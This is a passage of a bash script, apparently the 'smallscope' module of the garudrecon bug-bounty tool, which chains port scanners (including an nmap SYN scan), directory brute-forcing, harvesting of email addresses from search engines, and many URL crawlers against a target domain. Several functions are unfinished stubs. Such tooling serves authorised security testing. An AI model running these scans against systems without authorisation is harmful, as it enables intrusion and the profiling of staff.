#!/bin/bash

# Default config file path
CONFIG_PATH="configuration/garudrecon.cfg"

TARGET=""

EXCLUDE_FUNCS=()
RECON_XSS=false
RECON_SQLI=false
RECON_LFI=false
RECON_RCE=false
RECON_IIS=false

# Help function
function show_help() {
  cat <<EOF
Performs a minimal reconnaissance on the target domain, typically scoped as support.domain.com. This includes port scanning, url crawling, vulnerability checks (like XSS, SQLi, LFI, etc.).

Usage:
  garudrecon smallscope [flags]

Flags:
  -d, --domain				Scan a domain (e.g. support.domain.com)
  -ef, --exclude-functions		Exclude a function from running (e.g. WAYMORE)
  -rx, --recon-xss			Run full recon with XSS checks
  -rs, --recon-sqli			Run full recon with SQLi checks
  -rl, --recon-lfi			Run full recon with LFI checks
  -rst, --recon-subtakeover		Run full recon with Subdomain Takeover checks
  -rr, --recon-rce 	   		Run full recon with RCE checks
  -ri, --recon-iis 	   		Run full recon with IIS checks
  -c, --config				Custom configuration file path
  -h, --help				help for smallscope

Example:
# Full recon
  garudrecon smallscope -d support.domain.com

# Recon with XSS only
  garudrecon smallscope -d support.domain.com -rx

# Recon with SQLi only
  garudrecon smallscope -d support.domain.com -rs

# Exclude functions manually
  garudrecon smallscope -d support.domain.com -ef "GOSPIDER,WAYMORE"

# Combined
  garudrecon smallscope -d support.domain.com -rx -ef "WAYMORE"
EOF
}

# Check if no args
if [[ $# -eq 0 ]]; then
  show_help
  exit 0
fi

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -d|--domain)
            TARGET="$2"
            shift 2
            ;;
        -ef|--exclude-functions)
            IFS=',' read -ra raw_funcs <<< "$2"
            EXCLUDE_FUNCS=()
            for func in "${raw_funcs[@]}"; do
                trimmed_func=$(echo "$func" | xargs)
                EXCLUDE_FUNCS+=("$trimmed_func")
            done
            shift 2
            ;;
	    -rx|--recon-xss)
	        RECON_XSS=true
	        shift
	        ;;
	    -rs|--recon-sqli)
	        RECON_SQLI=true
	        shift
	        ;;
	    -rl|--recon-lfi)
	        RECON_LFI=true
	        shift
	        ;;
	    -rr|--recon-rce)
	        RECON_RCE=true
	        shift
	        ;;
	    -ri|--recon-iis)
	        RECON_IIS=true
	        shift
	        ;;
        -c|--config)
            CONFIG_PATH="$2"
            shift 2
            ;;
        -h|--help)
	        show_help
	        exit 0
	        ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Escape dots in domain for regex
ESCAPED_TARGET=$(echo "$TARGET" | sed 's/\./\\./g')

if [[ -z "$TARGET" ]]; then
    echo "Error: Target domain is required. Use -d <domain>"
    exit 1
fi

# Load configuration
if [[ -f "$CONFIG_PATH" ]]; then
    source "$CONFIG_PATH"
else
    echo "Error: Configuration file '$CONFIG_PATH' not found."
    exit 1
fi

PRINTBANNER

# Check root user
AREUROOTUSER

# Base directory
BASEDIR="scans"

# Function to generate a unique directory name
generate_unique_dir(){
    local dir_path="$BASEDIR/$TARGET"
    local counter=1
    
    while [ -d "$dir_path" ]; do
        dir_path="$BASEDIR/${TARGET}_$counter"
        ((counter++))
    done

    echo "$dir_path"
}

# Generate unique domain directory
UNIQUEDOMAINDIR=$(generate_unique_dir)
TMPDIR="$UNIQUEDOMAINDIR/.tmp"

# Subdirectories within .tmp
SUBDOMAINDIR="$TMPDIR/subdomain"
FFUFBRUTE="$TMPDIR/ffufbrute"
FAVICON_HASH="$TMPDIR/favicon_hash"
SCREENSHOTS="$TMPDIR/screenshots"
URLSDIR="$TMPDIR/urls"
VULNDIR="$TMPDIR/vuln"
GITHUB_ENDPOINTSDIR="$URLSDIR/github_endpoints"
CRAWLEYDIR="$URLSDIR/crawley"
CARIDDIDIR="$URLSDIR/cariddi"
XCRAWL3RDIR="$URLSDIR/xcrawl3r"
GOLINKFINDERDIR="$URLSDIR/GoLinkFinder"
AUTOMATED_GOOGLE_DORKINGDIR="$URLSDIR/dorks_hunter"
SOURCEMAPPERDIR="$URLSDIR/sourcemapper"
FTPDIR="$VULNDIR/ftp"
IISIDR="$VULNDIR/iis"
DOTGITDIR="$VULNDIR/dotgit"
PDFTOTEXTDIR="$VULNDIR/pdftotext"

# Root-level directories in UNIQUEDOMAINDIR
ROOT_SUBDOMAINDIR="$UNIQUEDOMAINDIR/subdomain"
ROOT_URLSDIR="$UNIQUEDOMAINDIR/urls"
ROOT_EMAILSDIR="$UNIQUEDOMAINDIR/emails"
ROOT_VULNDIR="$UNIQUEDOMAINDIR/vuln"
ROOT_INPUTFILES="$UNIQUEDOMAINDIR/inputfiles"
ROOT_WORDLISTDIR="$UNIQUEDOMAINDIR/wordlist"

ERRORLOGFILE="$UNIQUEDOMAINDIR/error.log"
RESUMELOGFILE="$UNIQUEDOMAINDIR/resume.cfg"


# Creating directories
# Subdirectories within .tmp
mkdir -p "$UNIQUEDOMAINDIR"
mkdir -p "$TMPDIR"
mkdir -p "$SUBDOMAINDIR"
mkdir -p "$FFUFBRUTE"
mkdir -p "$FAVICON_HASH"
mkdir -p "$SCREENSHOTS"
mkdir -p "$URLSDIR"
mkdir -p "$VULNDIR"
mkdir -p "$GITHUB_ENDPOINTSDIR"
mkdir -p "$CRAWLEYDIR"
mkdir -p "$CARIDDIDIR"
mkdir -p "$XCRAWL3RDIR"
mkdir -p "$GOLINKFINDERDIR"
mkdir -p "$AUTOMATED_GOOGLE_DORKINGDIR"
mkdir -p "$SOURCEMAPPERDIR"
mkdir -p "$FTPDIR"
mkdir -p "$IISIDR"
mkdir -p "$DOTGITDIR"
mkdir -p "$PDFTOTEXTDIR"

# Root-level directories in UNIQUEDOMAINDIR
mkdir -p "$ROOT_SUBDOMAINDIR"
mkdir -p "$ROOT_URLSDIR"
mkdir -p "$ROOT_EMAILSDIR"
mkdir -p "$ROOT_VULNDIR"
mkdir -p "$ROOT_INPUTFILES"
mkdir -p "$ROOT_WORDLISTDIR"

# Creating files
touch "$ROOT_INPUTFILES/crunchbase.txt"
touch "$ROOT_INPUTFILES/manual_google_dorking.txt"

# Utility function to check if a function is excluded
is_excluded() {
    local func="$1"
    for excluded in "${EXCLUDE_FUNCS[@]}"; do
        if [[ "$excluded" == "$func" ]]; then
            return 0
        fi
    done
    return 1
}

run() {
    local func="$1"
    if is_excluded "$func"; then
        echo -e "${YELLOW}[~] $func${RESET}: 0, ${TIME} seconds" | unew -a $RESUMELOGFILE
    else
        $func
    fi
}

# Function to handle CLEANUP on Ctrl+C
CLEANUP(){
    if [[ -n "$SPINNER_PID" ]]; then
        kill "$SPINNER_PID" 2>/dev/null
    fi
    exit 1
}
trap CLEANUP SIGINT

START_SPINNER(){
    processing="${1}"
    START_TIME=$(date +%s)
    BRAILLE_STYLE_SPINNER_CHARS=("â ‹" "â ™" "â ¹" "â ¸" "â ¼" "â ´" "â ¦" "â §" "â ‡" "â ")
    # SLASH_SPINNER_CHARS=("/" "-" "\\" "|")
    # ARC_SPINNER_CHARS=("â—" "â—“" "â—‘" "â—’")
    # CLASSIC_DOTS_SPINNER_CHARS=("â ‚" "â ’" "â " "â °" "â ´" "â ¦" "â –" "â ’")
    # ARROW_SPINNER_CHARS=("â†" "â†–" "â†‘" "â†—" "â†’" "â†˜" "â†“" "â†™")
    # BOX_SPINNER_CHARS=("â––" "â–˜" "â–" "â–—")
    # QUARTERS_SPINNER_CHARS=("â—´" "â—·" "â—¶" "â—µ")
    # CLOCK_SPINNER_CHARS=("ðŸ•›" "ðŸ•" "ðŸ•‘" "ðŸ•’" "ðŸ•“" "ðŸ•”" "ðŸ••" "ðŸ•–" "ðŸ•—" "ðŸ•˜" "ðŸ•™" "ðŸ•š")
    # EMOJI_SPINNER_CHARS=("ðŸŒ‘" "ðŸŒ’" "ðŸŒ“" "ðŸŒ”" "ðŸŒ•" "ðŸŒ–" "ðŸŒ—" "ðŸŒ˜")
    # TRAIL_SPINNER_CHARS=("â " "â ‚" "â „" "â ‚")

    while true; do
    	ELAPSED=$(( $(date +%s) - START_TIME ))
        for char in "${BRAILLE_STYLE_SPINNER_CHARS[@]}"; do
            printf "${YELLOW}[${char}]${RESET} ${processing} ${CYAN}(${ELAPSED} seconds)${RESET} ðŸ”Ž"
            printf "                                    \r"
            sleep 0.05
        done
    done &
    SPINNER_PID=$!
}

STOP_SPINNER(){
    kill "${SPINNER_PID}" 2>/dev/null
    TIME=$(( $(date +%s) - START_TIME ))
    return $TIME
}

STARTED_AT=$(date +"%d-%m-%Y_%H:%M:%S")
START_EPOCH=$(date +%s)

echo -e "Using $CONFIG_PATH"
echo -e "Saving all files in $UNIQUEDOMAINDIR"


NUCLEIHUB_TEMPLATES(){
	# if $ROOT_WORDLISTDIR/nuclei-templates and $ROOT_WORDLISTDIR/nucleihub-templates not exist then run these commands

	nuclei -duc -silent -update-templates -update-template-dir $ROOT_WORDLISTDIR/nuclei-templates &>/dev/null
    git clone https://github.com/rix4uni/nucleihub-templates.git --depth 1 $ROOT_WORDLISTDIR/nucleihub-templates &>/dev/null
}


# Port Scanning
NAABU(){
	START_SPINNER "${BGREEN}NAABU${RESET}"

	echo "$TARGET" | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 2>/dev/null | unew -ef -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/subdomain/naabu.txt 2>/dev/null | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] NAABU${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MASSCAN(){
	START_SPINNER "${BGREEN}MASSCAN${RESET}"

	echo "$TARGET" | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt
	masscan -p1-65535 -iL final-ips.txt --max-rate 10000 -oG $TARGET_OUTPUT

	STOP_SPINNER
	echo -e "${BGREEN}[+] MASSCAN${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

RUSTSCAN(){
	START_SPINNER "${BGREEN}RUSTSCAN${RESET}"

	echo "$TARGET" | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	rustscan -a "$TARGET"

	STOP_SPINNER
	echo -e "${BGREEN}[+] RUSTSCAN${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

NMAP(){
	START_SPINNER "${BGREEN}NMAP${RESET}"

	echo "$TARGET" | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	nmap "$TARGET" -sS -T4 -Pn -p 1-1000 --open 2>/dev/null

	STOP_SPINNER
	echo -e "${BGREEN}[+] NMAP${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Subdomain Probing
HTTPX(){
	START_SPINNER "${BGREEN}HTTPX${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/httpx.txt

	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk '{print $1}' | dlevel --silent --max-level | unew -el -i -t -q ${SUBDOMAINDIR}/alivesubs.txt
	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk '{print $1}' | sed -e 's/https\?:\/\/\(www\.\)\?//' -e 's/:.*$//' | dlevel --silent --max-level | unew -el -i -t -q ${SUBDOMAINDIR}/withoutprotocolsubs.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] HTTPX${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/httpx.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Directory Enumeration
FFUFDIRENUM(){
	START_SPINNER "${BGREEN}FFUFDIRENUM${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk -F' ' '{ if ($2 == "[403]" || $2 == "[404]" || $2 == "[302]") print $1 }' | unew -el -i -t -q notaccessible_subs.txt
	cat notaccessible_subs.txt | interlace --silent -threads ${INTERLACE_THREADS} -c "ffuf -s -u _target_/FUZZ -w wordlists/onelistforallshort.txt -mc ${FFUFDIRENUM_STATUS_MATCH} -o _output_/_cleantarget_.json" -o ${SUBDOMAINDIR}/ffufdirenum

	STOP_SPINNER
	echo -e "${BGREEN}[+] FFUFDIRENUM${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DIRSEARCH(){
	START_SPINNER "${BGREEN}DIRSEARCH${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] DIRSEARCH${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

FEROXBUSTER(){
	START_SPINNER "${BGREEN}FEROXBUSTER${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] FEROXBUSTER${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

WFUZZ(){
	START_SPINNER "${BGREEN}WFUZZ${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] WFUZZ${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Email Enumeration
EMAILFINDER(){
	START_SPINNER "${BGREEN}EMAILFINDER${RESET}"

	echo "${TARGET}" | emailfinder saved | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	echo "${TARGET}" | emailfinder skymem | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	echo "${TARGET}" | emailfinder google -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	echo "${TARGET}" | emailfinder bing -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	echo "${TARGET}" | emailfinder duckduckgo -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	echo "${TARGET}" | emailfinder yahoo -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	echo "${TARGET}" | emailfinder yandex -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails

	STOP_SPINNER
	echo -e "${BGREEN}[+] EMAILFINDER${RESET}: $(wc -l 2>/dev/null < ${ROOT_EMAILSDIR}/emailfinder.emails || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Url Crawling
WAYMORE(){
	START_SPINNER "${BGREEN}WAYMORE${RESET}"

	timelimitx -t ${WAYMORE_TIMELIMITX} "echo ${TARGET} | waymore -mode U -lr 3 -lcc 3 -f 2>/dev/null | unew -el -i -t -q ${URLSDIR}/waymore.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/waymore.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/waymore.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] WAYMORE${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/waymore.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

HAKRAWLER(){
	START_SPINNER "${BGREEN}HAKRAWLER${RESET}"

	timelimitx -t ${HAKRAWLER_TIMELIMITX} "echo ${TARGET} | hakrawler -insecure -t ${HAKRAWLER_THREADS} -timeout ${HAKRAWLER_TIMEOUT} -d ${HAKRAWLER_DEPTH} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/hakrawler.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/hakrawler.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/hakrawler.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] HAKRAWLER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/hakrawler.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

WAYBACKURLS(){
	START_SPINNER "${BGREEN}WAYBACKURLS${RESET}"

	timelimitx -t ${WAYBACKURLS_TIMELIMITX} "echo ${TARGET} | waybackurls | unew -el -i -t -q ${URLSDIR}/waybackurls.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/waybackurls.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/waybackurls.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] WAYBACKURLS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/waybackurls.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

KATANA(){
	START_SPINNER "${BGREEN}KATANA${RESET}"

	timelimitx -t ${KATANA_TIMELIMITX} "echo ${TARGET} | katana -duc -silent -nc -ps -jc -kf -fx -xhr -concurrency ${KATANA_THREADS} -parallelism ${KATANA_PARALLELISM} -depth ${KATANA_DEPTH} -timeout ${KATANA_TIMEOUT} ${KATANA_RETRY} -delay ${KATANA_DELAY} -rate-limit ${KATANA_RATELIMIT} -crawl-duration ${KATANA_CRAWLDURATION} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/katana.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/katana.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/katana.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] KATANA${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/katana.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GAU(){
	START_SPINNER "${BGREEN}GAU${RESET}"

	timelimitx -t ${GAU_TIMELIMITX} "echo ${TARGET} | gau --threads ${GAU_THREADS} --timeout ${GAU_TIMEOUT} --retries ${GAU_RETRIES} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gau.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/gau.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gau.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GAU${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/gau.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOSPIDER(){
	START_SPINNER "${BGREEN}GOSPIDER${RESET}"

	gospider -s "${TARGET}" -q --js --robots --sitemap -a -w -r --threads ${GOSPIDER_THREADS} --concurrent ${GOSPIDER_CONCURRENT} --depth ${GOSPIDER_DEPTH} --delay ${GOSPIDER_DELAY} --timeout ${GOSPIDER_TIMEOUT} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gospider.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/gospider.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gospider.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOSPIDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/gospider.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

UFORALL(){
	START_SPINNER "${BGREEN}UFORALL${RESET}"

	timelimitx -t ${UFORALL_TIMELIMITX} "echo ${TARGET} | uforall -silent -t all 2>/dev/null | unew -el -i -t -q ${URLSDIR}/uforall.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/uforall.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/uforall.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] UFORALL${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/uforall.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

# CARIDDI(){
# 	START_SPINNER "${BGREEN}CARIDDI${RESET}"

# 	# Check if the file exists and has 0 lines
#     if [ ! -s "${SUBDOMAINDIR}/alivesubs.txt" ]; then
#         echo -e "${BRED}[x] CARIDDI${RESET}: 0, ${TIME} seconds"
#         STOP_SPINNER
#         return
#     fi

# 	timelimitx -t ${CARIDDI_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads ${INTERLACE_CARIDDI_THREADS} -c \"echo _target_ | cariddi -c $CARIDDI_CONCURRENCY -d $CARIDDI_DELAY -t $CARIDDI_TIMEOUT -rua 2>/dev/null > _output_/_cleantarget_.urls\" -o ${CARIDDIDIR} 2>/dev/null"
# 	cat ${CARIDDIDIR}/*.urls | unew -el -t -q ${URLSDIR}/cariddi.urls

# 	# Reuse old scanned data
# 	cat ${BASEDIR}/${TARGET}*/.tmp/urls/cariddi.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/cariddi.urls

# 	STOP_SPINNER
# 	echo -e "${BGREEN}[+] CARIDDI${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/cariddi.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
# }

URLFINDER(){
	START_SPINNER "${BGREEN}URLFINDER${RESET}"

	timelimitx -t ${URLFINDER_TIMELIMITX} "echo ${TARGET} | urlfinder -silent -nc -all -config ~/.config/urlfinder/config.yaml -pc ~/.config/urlfinder/provider-config.yaml -timeout ${URLFINDER_TIMEOUT} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/urlfinder.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/urlfinder.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/urlfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] URLFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/urlfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GITHUB_ENDPOINTS(){
	START_SPINNER "${BGREEN}GITHUB_ENDPOINTS${RESET}"

	github-endpoints -d "${TARGET}" -k -raw -t ~/.config/github-endpoints/.github_tokens -o ${URLSDIR}/github-endpoints.urls 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/github-endpoints.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/github-endpoints.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GITHUB_ENDPOINTS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/github-endpoints.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XURLFIND3R(){
	START_SPINNER "${BGREEN}XURLFIND3R${RESET}"

	timelimitx -t ${XURLFIND3R_TIMELIMITX} "echo ${TARGET} | xurlfind3r --silent --include-subdomains | unew -el -t -q ${URLSDIR}/xurlfind3r.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xurlfind3r.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/xurlfind3r.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] XURLFIND3R${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/xurlfind3r.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XCRAWL3R(){
	START_SPINNER "${BGREEN}XCRAWL3R${RESET}"

	timelimitx -t ${XCRAWL3R_TIMELIMITX} "xcrawl3r --silent --monochrome -u ${TARGET} --depth $XCRAWL3R_DEPTH --timeout $XCRAWL3R_TIMEOUT --concurrency $XCRAWL3R_CONCURRENCY --delay $XCRAWL3R_DELAY --parallelism $XCRAWL3R_PARALLELISM --include-subdomains | unew -el -t -q ${URLSDIR}/xcrawl3r.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xcrawl3r.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/xcrawl3r.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] XCRAWL3R${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/xcrawl3r.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CRAWLEY(){
	START_SPINNER "${BGREEN}CRAWLEY${RESET}"

	timelimitx -t ${CRAWLEY_TIMELIMITX} "crawley -silent -all -brute -delay ${CRAWLEY_DELAY} -skip-ssl -js -robots crawl -depth ${CRAWLEY_DEPTH} -timeout ${CRAWLEY_TIMEOUT} -workers ${CRAWLEY_WORKERS} ${TARGET} | unew -el -t -q ${URLSDIR}/crawley.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/crawley.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/crawley.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] CRAWLEY${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/crawley.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOLINKFINDER(){
	START_SPINNER "${BGREEN}GOLINKFINDER${RESET}"

	GoLinkFinder --silent -d ${TARGET} --complete-url --concurrency ${GOLINKFINDER_CONCURRENCY} --delay ${GOLINKFINDER_DELAY} --timeout ${GOLINKFINDER_TIMEOUT} | unew -el -t -q ${URLSDIR}/GoLinkFinder.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/GoLinkFinder.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/GoLinkFinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOLINKFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/GoLinkFinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GALER(){
	START_SPINNER "${BGREEN}GALER${RESET}"

	timelimitx -t ${GALER_TIMELIMITX} "echo ${TARGET} | galer --silent --depth ${GALER_DEPTH} --timeout ${GALER_TIMEOUT} --concurrency ${GALER_CONCURRENCY} --same-root 2>/dev/null | unew -el -i -t -q ${URLSDIR}/galer.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/galer.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/galer.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GALER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/galer.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOURLEX(){
	START_SPINNER "${BGREEN}GOURLEX${RESET}"

	gourlex -t ${TARGET} -uO -s | unew -el -t -q ${URLSDIR}/gourlex.urls 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null

	# Reuse old scanned data
	# cat ${BASEDIR}/${TARGET}*/.tmp/urls/galer.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/galer.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOURLEX${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/gourlex.urls|| echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

PATHFINDER(){
	START_SPINNER "${BGREEN}PATHFINDER${RESET}"

	if [ "$PATHFINDER_SCAN_MODE" = "NORMAL" ]; then
		for target in $(cat alivesubs.txt);do pathfinder -u $target --threads 25 --with-assets;done | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${URLSDIR}/pathfinder.urls
	fi

	if [ "$PATHFINDER_SCAN_MODE" = "ADVANCED" ]; then
		for target in $(cat alivesubs.txt);do pathfinder -u $target --threads 25 --with-assets;done | grep -aE "(https?://$TARGET(:[0-9]+)?(/)|\.$TARGET[:/])" | unew -el -t -q ${URLSDIR}/pathfinder.urls

		timelimitx -t 5m bash pathfinder-advanced.sh testphp.vulnweb.com
	fi

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/pathfinder.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/pathfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] PATHFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/pathfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

PATHCRAWLER(){
	START_SPINNER "${BGREEN}PATHCRAWLER${RESET}"

	echo "${TARGET}" | pathcrawler -silent -complete-url -concurrent $PATHCRAWLER_CONCURRENT -delay $PATHCRAWLER_DELAY -timeout $PATHCRAWLER_TIMEOUT 2>/dev/null | unew -el -t -q ${URLSDIR}/pathcrawler.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/pathcrawler.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/pathcrawler.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] PATHCRAWLER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/pathcrawler.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

ROBOXTRACTOR(){
	START_SPINNER "${BGREEN}ROBOXTRACTOR${RESET}"

